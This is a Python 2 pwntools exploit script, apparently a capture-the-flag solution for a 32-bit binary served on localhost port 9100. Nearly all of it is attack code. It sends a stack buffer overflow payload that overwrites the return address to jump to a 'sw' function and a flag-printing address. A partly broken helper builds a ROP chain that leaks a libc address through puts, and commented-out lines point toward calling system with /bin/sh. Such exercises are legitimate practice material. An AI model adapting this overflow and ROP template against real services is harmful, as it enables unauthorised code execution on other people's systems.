#!/usr/bin/env python2
from pwn import *

REMOTE = False
REMOTE = True

context(os = 'linux', arch = 'i386')
context.log_level = 'debug'
context.terminal = ['terminator', '-e']
#context.terminal = 'terminator'
context.timeout = 1000

target      = {'host':'127.0.0.1', 'port':9100}

#==========

bin_file  = './binaryfile'
#libc_file = './bin/libc-2.28.so'
#if REMOTE:
#    libc_file = './bin/libc-2.23.so'

binf = ELF(bin_file)
#globl_inad          = binf.symbols['global_buffer']
#addr_vlnf           = binf.functions['vlnf'].address
#addr_plt_puts       = binf.plt['puts']
#addr_plt_fflush     = binf.plt['fflush']
#addr_plt_system      = binf.plt['system']
#addr_got_main       = binf.got['__libc_start_main']
#addr_got_stdout     = binf.got['stdout']
#addr_got_system      = binf.got['system']

addr_func_sw        = binf.symbols['sw']
addr_show_flag      = 0x0804883f

#addr_popret         = 0x080483ad

addr_local_input    = 0xffffd920
addr_local_ret      = 0xffffd94c
offset_bof_attack   = addr_local_ret - addr_local_input
#offset_fms_attack   = 1

info("offset buffer overflow {}".format(offset_bof_attack))

#libc = ELF(libc_file)
#offset_libc_main    = libc.functions['__libc_start_main'].address

#==========

def attack(conn):
    info('start attack')
    #conn.recvuntil('Name :')

    #gifts = conn.recvline()
    #info(hexdump(gifts))

    #addr_sh             = gifts.split()[6]
    #addr_sh             = int(addr_sh, 16)
    #info("addr_sh {}".format(hex(addr_sh)))
    #addr_system         = gifts.split()[7]
    #addr_system         = int(addr_system, 16)
    #info("addr_system {}".format(hex(addr_system)))

    #libc.address        = leak_libc_base(conn)
    #info("addr_libc_base    = 0x{:08x}".format(libc.address))
    #addr_libc_system    = libc.functions['system'].address + libc.address
    #addr_libc_sh        = libc.search('/bin/sh').next()

    info(hexdump(conn.recvuntil('Password:')))
    exploit      = ''
    exploit     += 'A' * (offset_bof_attack - len(exploit))
    exploit     += p32(addr_func_sw)
    exploit     += p32(addr_show_flag)
    exploit     += p32(0x1)
    conn.sendline(exploit)

    #info(hexdump(conn.recvuntil('What is your name?')))
    #conn.sendline('/bin/sh')

def leak_libc_base(conn):
    rop = ROP(binf)
    rop.call('puts', [binf.got['__libc_start_main']])
    rop.call('vlnf')  #rop.call('puts', [binf.got['__libc_start_main']])
    info(rop.dump())

    #rop = ROP(binf)
    #rop.call('puts', [binf.got['__libc_start_main']])
    #rop.call('fflush', [binf.got['stdout']])  #rop.call('fflush', [1])
    #rop.call('vlnf')  #rop.call('puts', [binf.got['__libc_start_main']])
    #info(rop.dump())

    exploit      = 'A'*offset
    exploit     += rop.chain()
    conn.sendline(exploit)

    info('recv1'); info(hexdump(conn.recvline()))
    info('recv2'); info(hexdump(conn.recvline()))
    info('recv3'); info(hexdump(conn.recvline()))

    #recv         = conn.recv(8)
    #info(hexdump(recv))

    #addr_libc_main      = u64(recv)
    #addr_libc_base      = addr_libc_main - offset_libc_main

    #return addr_libc_base
    return 0xdeadbeef

def debug(conn):
    gdb.attach(conn, '''
    b *0x8048747
    ''')
    raw_input('Press Enter to Continue')

#==========

if __name__ == '__main__':
    if REMOTE:
        conn = remote(**target)
    else:
        conn = process(bin_file)
        #debug(conn)
    attack(conn)
    conn.interactive()
    conn.close()

#==========
